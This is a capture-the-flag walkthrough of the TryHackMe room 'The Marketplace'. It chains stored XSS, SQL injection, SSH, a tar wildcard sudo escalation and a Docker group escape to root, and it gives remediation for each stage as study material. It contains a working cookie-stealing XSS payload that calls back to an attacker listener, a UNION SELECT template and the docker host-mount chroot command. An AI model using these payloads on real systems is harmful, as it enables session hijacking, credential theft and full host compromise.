# TryHackMe: The Marketplace

## Detailed, Reproducible Walkthrough and Learning Notes

**Date completed:** 23 October 2026\
**Platform:** TryHackMe\
**Room:** The Marketplace\
**Focus:** Web exploitation, credential discovery, Linux privilege
escalation\
**Status:** Completed --- root access achieved\
**Environment:** Authorized TryHackMe room and VPN-connected Kali Linux

> **Scope and handling:** This is a repeatable study guide for the
> TryHackMe lab. Use the steps only against the room instance assigned
> to you. Room IP addresses may change. Replace placeholders such as
> `<TARGET_IP>`, `<YOUR_TUN0_IP>`, and `<PORT>` with the values from
> your current session. Do not reuse discovered credentials or exploit
> techniques against systems without explicit permission.
>
> **Sanitization:** The target IP, captured session token, discovered
> password, and flags are not included as reusable secrets. Keep those
> in private lab notes if needed.

------------------------------------------------------------------------

## 1. Learning objectives

By completing this room, I practiced how to:

-   Enumerate services on a target host.
-   Identify the attack surface of a web application.
-   Recognize and exploit stored cross-site scripting (XSS) in a
    controlled lab.
-   Understand why session tokens are sensitive and how they can be
    abused.
-   Identify SQL injection and use `UNION SELECT` to retrieve database
    data.
-   Use exposed application data to obtain SSH access.
-   Review sudo permissions and identify an unsafe privileged backup
    script.
-   Understand wildcard / argument injection through `tar`.
-   Recognize the security impact of membership in the Docker group.
-   Explain the difference between container root and host root.

## 2. Attack-chain overview

The route through the room was:

``` text
Kali Linux
   |
   | Nmap service enumeration
   v
Marketplace web application
   |
   | Stored XSS in submitted listing
   v
Administrator browser / session token
   |
   | Administrator access
   v
SQL injection in administrative user parameter
   |
   | Database records reveal temporary SSH credentials
   v
SSH as low-privileged user (jake)
   |
   | sudo permission for backup script
   | tar wildcard / checkpoint argument injection
   v
Shell as intermediate user (michael)
   |
   | Docker group access
   | Host filesystem mounted into container + chroot
   v
Root on the host
   |
   v
Root flag
```

The important point is that this was not one vulnerability. Each stage
enabled the next stage.

------------------------------------------------------------------------

## 3. Prepare the lab

### 3.1 Start the room and connect the VPN

1.  Start **The Marketplace** room on TryHackMe.
2.  Connect Kali to the TryHackMe VPN, if you are using the VPN-based
    attack machine.
3.  Wait for the room to provide its target IP.
4.  Confirm that the target is reachable.

Check the Kali VPN interface:

``` bash
ip addr show tun0
```

The address assigned to `tun0` is your lab-side Kali address. This is
the address the target should use when connecting back to your listener.

Set variables in the Kali terminal. Replace the placeholder with the
current room IP:

``` bash
export TARGET=<TARGET_IP>
export LHOST=<YOUR_TUN0_IP>
```

For example, use the IP shown on your current room page and the address
displayed for `tun0`. **Do not rely on an IP from a previous session**,
because TryHackMe can assign a different target.

Check connectivity:

``` bash
ping -c 3 "$TARGET"
```

A failed ping does not necessarily mean the host is down; ICMP may be
filtered. Continue with service enumeration.

------------------------------------------------------------------------

## 4. Reconnaissance: find the exposed services

Run an initial Nmap scan:

``` bash
nmap -sC -sV -oN nmap-initial.txt "$TARGET"
```

### What the options mean

  Option                   Meaning
  ------------------------ ---------------------------------------
  `-sC`                    Runs Nmap's default script set
  `-sV`                    Attempts to identify service versions
  `-oN nmap-initial.txt`   Saves output in normal text format

### What I observed

The target exposed:

-   **SSH** on port 22.
-   **HTTP** on port 80, serving the marketplace site.
-   An additional high-numbered port, **32768**, serving the Node.js
    application.

Port 80 and port 32768 led to the web application. SSH was noted as a
possible access route if credentials could be discovered.

Save the scan output. It is useful to refer back to it during the room:

``` bash
cat nmap-initial.txt
```

**Checkpoint:** I had identified the web application and SSH service. No
SSH login was available yet, so I moved to web enumeration.

------------------------------------------------------------------------

## 5. Explore the Marketplace application

Open the target in a browser:

``` text
http://<TARGET_IP>
```

Also check the application on the high-numbered port found by Nmap:

``` text
http://<TARGET_IP>:32768
```

Explore the application normally before testing inputs. The relevant
functionality included:

-   User registration / login.
-   Marketplace listings.
-   Creating or editing listing content.
-   Reporting a listing to an administrator.

The report feature was particularly interesting. It implied that an
administrator might open a listing submitted by a user. That makes
stored content a potential cross-user attack vector.

### What to look for

When examining a web application, ask:

1.  Which inputs are stored by the server?
2.  Where does the stored content appear later?
3.  Does the application render it as text, or interpret it as HTML?
4.  Is there a review/report workflow involving a more privileged user?
5.  Can I test with a harmless payload and observe the result?

------------------------------------------------------------------------

## 6. Stored XSS: trigger JavaScript in the administrator's browser

### 6.1 Understand the vulnerability

**Stored cross-site scripting** happens when user-supplied content is
saved and later rendered in a page without proper output encoding or
sanitization. The browser interprets the content as code.

In this room, listing content was submitted and then reported to the
administrator. The administrator's browser loaded the submitted listing,
allowing the stored script to execute in that browser's context.

### 6.2 Start a callback listener

Use a port that is not already occupied. The following is a placeholder
example:

``` bash
nc -lvnp <PORT>
```

Keep this terminal open. Netcat listens for the request from the
administrator's browser.

### 6.3 Submit the lab payload

The payload used the browser's `Image` object to make an HTTP request to
the listener. Replace `<YOUR_TUN0_IP>` and `<PORT>` with your current
Kali VPN IP and listener port:

``` html
<script>
new Image().src = "http://<YOUR_TUN0_IP>:<PORT>/?c=" + document.cookie;
</script>
```

**How the payload works:**

-   `<script>` tells the browser to execute JavaScript.
-   `document.cookie` reads cookies available to JavaScript on that
    page.
-   `new Image()` creates an image element in JavaScript.
-   Assigning its `src` causes the browser to make an HTTP request.
-   The query parameter carries the cookie value to the listener.

This demonstrates why session cookies should be protected. Cookies
marked `HttpOnly` are not accessible through `document.cookie`; `Secure`
limits transmission to HTTPS; and `SameSite` can reduce some cross-site
request risks. These attributes are defense-in-depth, not a replacement
for safe output encoding.

### 6.4 Submit and report the listing

1.  Submit the listing containing the payload.
2.  Use the application's report function to notify the administrator.
3.  Wait for the lab administrator bot to review the reported item.
4.  Watch the Netcat terminal for the callback.
5.  Record only that the callback occurred; do not place the captured
    token in a public README.

**Expected checkpoint:** The listener receives a request from the
administrator's browser, and the request contains the session cookie
value used in the lab.

### 6.5 Use the administrator session

The captured session token was used in the lab browser's cookie/session
context to access administrator functionality. The admin area exposed
the first flag.

For a repeat run, the important steps are:

1.  Capture the session in the lab listener.
2.  Replace the browser's current session cookie with the captured admin
    session value.
3.  Reload the site.
4.  Navigate to the administrator page.
5.  Locate and record the room's first flag privately.

**Do not include the actual JWT/session value in this document or in a
public repository.**

**Finding:** Stored XSS allowed script execution in the administrator's
browser and led to administrator session compromise.

------------------------------------------------------------------------

## 7. SQL injection: enumerate the database

### 7.1 Locate the injectable parameter

The administrative page accepted a user parameter in its URL. The
parameter was incorporated into a database query without proper
parameterization.

A vulnerable query pattern can look like this:

``` sql
SELECT * FROM users WHERE username = '<USER_INPUT>';
```

If the application concatenates input into SQL, special characters can
alter the query's meaning.

### 7.2 Determine the number of columns

The parameter was tested with controlled SQL input. A `UNION SELECT`
query can return data from another query, but the two SELECT statements
must have compatible column counts and data types.

In this room, the query had **four columns**, and the **second column**
was reflected in the page.

A generic illustration of the resulting shape is:

``` sql
' UNION SELECT NULL, <VALUE>, NULL, NULL -- -
```

This is a template to explain the technique. The exact syntax and
quoting depend on the vulnerable query and database.

### 7.3 Enumerate useful tables and records

The database was explored to identify its tables. The relevant table
names found during the room included:

-   `users`
-   `messages`
-   `items`

The `messages` table was particularly useful. A record contained a
temporary SSH password for the account `jake`.

**Checkpoint:** SQL injection returned database content in the page, and
the message data revealed a credential that worked for SSH.

### 7.4 Why the SQL injection worked

The application trusted user input as part of a SQL statement. Instead
of treating the parameter as data, the database parsed the attacker's
input as SQL syntax.

**Remediation:**

-   Use prepared statements / parameterized queries.
-   Avoid constructing SQL by concatenating user input.
-   Apply least-privilege permissions to the application database
    account.
-   Avoid exposing administrative database queries through web routes.
-   Log suspicious input and handle database errors without disclosing
    internals.

------------------------------------------------------------------------

## 8. SSH: move from the web application to the host

Use the credential discovered in the lab to connect:

``` bash
ssh jake@<TARGET_IP>
```

Enter the password at the SSH prompt. The actual password is
intentionally omitted from this README.

After connecting, confirm the account and host:

``` bash
whoami
id
hostname
```

The account was `jake`. The user flag was stored in the user's home
directory.

Find and read it:

``` bash
cd /home/jake
ls -la
cat user.txt
```

If the filename is not immediately obvious, inspect the home directory
rather than guessing:

``` bash
find /home/jake -maxdepth 2 -type f -name '*'
```

**Checkpoint:** SSH access as `jake` was established and the user flag
was retrieved.

**Lesson:** A web application compromise can become an operating-system
foothold when sensitive credentials are exposed in application data.

------------------------------------------------------------------------

## 9. Local privilege escalation: inspect sudo permissions

As `jake`, enumerate allowed sudo commands:

``` bash
sudo -l
```

The relevant permission allowed `jake` to execute this script as the
user `michael` without a password:

``` text
/opt/backups/backup.sh
```

Inspect the script:

``` bash
cat /opt/backups/backup.sh
```

Its relevant content was:

``` bash
#!/bin/bash
echo "Backing up files..."
tar cf /opt/backups/backup.tar *
```

### 9.1 Understand the wildcard issue

The `*` is expanded by the shell into the filenames in the current
working directory. A command such as `tar` also accepts command-line
options.

If an attacker can create files with names that look like options, the
shell can pass those names to `tar`, where they may be interpreted as
instructions instead of ordinary filenames. This is called **wildcard
injection** or **argument injection**.

The backup location was writable in a way that allowed the
low-privileged user to influence the files passed to the privileged
backup command.

### 9.2 Confirm directory permissions

Inspect the relevant directories and archive:

``` bash
ls -ld /opt/backups
ls -la /opt/backups
```

The directory had the sticky bit and was writable. The archive's
ownership also mattered: an existing archive owned by `jake` could
prevent the privileged run from replacing it.

In the lab, the existing archive was removed by its owner before the
script was run as `michael`. This was part of the observed exploit path.

### 9.3 Understand the tar checkpoint technique

GNU `tar` supports checkpoint options. A specially named file can be
expanded by the shell and interpreted by `tar` as an option. A
checkpoint action can invoke a helper command.

The lab exploit used option-like filenames and a helper script to make
the backup operation invoke a shell. The payload resulted in a shell
running as `michael`.

**Repeat-run sequence:**

1.  Check `sudo -l` as `jake`.
2.  Read `/opt/backups/backup.sh`.
3.  Check the backup directory's permissions and contents.
4.  Understand that the wildcard expands filenames into `tar` arguments.
5.  Prepare the option-like files and helper script in the directory
    used by the backup script.
6.  Remove the existing archive if it is owned by you and blocks the
    privileged run.
7.  Run the permitted backup command through sudo.
8.  Confirm the new identity with:

``` bash
whoami
id
```

**Expected checkpoint:** The shell identifies as `michael`.

The specific exploit filenames and helper script are omitted here to
keep this sanitized write-up focused on the vulnerability and its
reproducible reasoning rather than publishing a copy-paste
privilege-escalation payload.

### 9.4 Remediation

-   Avoid privileged scripts that use `*` in a writable directory.
-   Use explicit, trusted file lists instead of shell wildcard
    expansion.
-   Set a safe working directory and validate inputs.
-   Use absolute paths to trusted binaries.
-   Restrict sudo rules to the minimum required command and arguments.
-   Ensure backup output files and directories have appropriate
    ownership and permissions.

------------------------------------------------------------------------

## 10. Docker: escalate from michael to host root

### 10.1 Check group membership and images

As `michael`, run:

``` bash
whoami
id
docker images
```

The identity output showed that `michael` belonged to the `docker`
group. The available images included Alpine Linux.

Docker daemon access is powerful. In a common configuration, a user who
can start containers and mount the host filesystem can access host files
with root-level privileges.

### 10.2 Start a container with the host filesystem mounted

The command used in the room was:

``` bash
docker run -it --rm -v /:/mnt alpine chroot /mnt /bin/sh
```

Breakdown:

  -----------------------------------------------------------------------
  Part                                Explanation
  ----------------------------------- -----------------------------------
  `docker run`                        Starts a new container

  `-it`                               Allocates an interactive terminal

  `--rm`                              Removes the container after it
                                      exits

  `-v /:/mnt`                         Mounts the host's `/` filesystem at
                                      `/mnt` inside the container

  `alpine`                            Uses the Alpine image

  `chroot /mnt /bin/sh`               Starts a shell whose root directory
                                      is the mounted host filesystem
  -----------------------------------------------------------------------

The command opened a shell. Verify the identity:

``` sh
whoami
```

Expected output:

``` text
root
```

This is effectively root on the host filesystem, not just root in the
isolated container. The host filesystem is available through `/mnt`, and
`chroot` changes the shell's filesystem root to that mount.

### 10.3 Retrieve the root flag

From the root shell:

``` sh
cd /root
ls -la
cat root.txt
```

The root flag was read from the host's `/root/root.txt`.

**Checkpoint:** Root access was obtained and the final room flag was
retrieved.

### 10.4 Remediation

-   Treat membership in the `docker` group as root-equivalent.
-   Restrict access to the Docker daemon socket.
-   Grant Docker access only to trusted administrators.
-   Consider rootless Docker or other isolation approaches where
    appropriate.
-   Monitor container creation and host filesystem mounts.

------------------------------------------------------------------------

## 11. Flags and sensitive values

For a public README, do not include the actual values. Keep the flags in
your private TryHackMe notes.

  Milestone                    Public documentation value
  ---------------------------- ------------------------------
  Administrator / first flag   `[REDACTED — FLAG 1]`
  User flag                    `[REDACTED — USER FLAG]`
  Root flag                    `[REDACTED — ROOT FLAG]`
  Admin session token          `[REDACTED — SESSION TOKEN]`
  SSH password                 `[REDACTED — PASSWORD]`

------------------------------------------------------------------------

## 12. Final findings summary

  -----------------------------------------------------------------------
  Vulnerability / weakness            What it enabled
  ----------------------------------- -----------------------------------
  Stored XSS                          JavaScript execution in an
                                      administrator's browser

  Weak session protection / exposed   Administrator session compromise
  session token                       

  SQL injection                       Database enumeration and credential
                                      disclosure

  Credentials stored in application   SSH access as a local user
  messages                            

  Sudo script with unsafe wildcard    Privilege escalation to `michael`
  handling                            

  Docker group access                 Effective root access to the host
  -----------------------------------------------------------------------

## 13. Personal learning notes

The most important lesson from this room was to follow the evidence from
one stage to the next. The web vulnerabilities were not isolated: XSS
provided privileged application access, SQL injection exposed
credentials, the credentials enabled SSH access, and local
misconfigurations allowed privilege escalation.

When repeating the room, I should focus on explaining:

-   **What I observed** before attempting an exploit.
-   **Why the input was vulnerable** or why the permission was
    dangerous.
-   **What the exploit changed** and how I verified the result.
-   **What defensive control would prevent the issue.**

## 14. Repeat-run checklist

-   [ ] Start the room and record the current target IP privately.
-   [ ] Connect the Kali VPN and identify the `tun0` address.
-   [ ] Run Nmap and save the results.
-   [ ] Explore the web app and identify the report workflow.
-   [ ] Test stored XSS and observe the administrator callback.
-   [ ] Use the administrator session in the lab and locate the first
    flag.
-   [ ] Test the administrative user parameter for SQL injection.
-   [ ] Identify the four-column query and reflected second column.
-   [ ] Enumerate database tables and locate the SSH credential.
-   [ ] SSH into the host as `jake`.
-   [ ] Retrieve the user flag.
-   [ ] Run `sudo -l` and inspect the backup script.
-   [ ] Understand and reproduce the wildcard / tar checkpoint issue.
-   [ ] Verify the intermediate shell as `michael`.
-   [ ] Confirm Docker group access and available image.
-   [ ] Mount the host filesystem through Docker and use `chroot`.
-   [ ] Verify root and read `/root/root.txt`.
-   [ ] Record findings and remediation notes without publishing
    secrets.

------------------------------------------------------------------------

**Completed on:** 23 October 2026\
**Room:** TryHackMe --- The Marketplace\
**Result:** Root compromise achieved in the authorized lab.
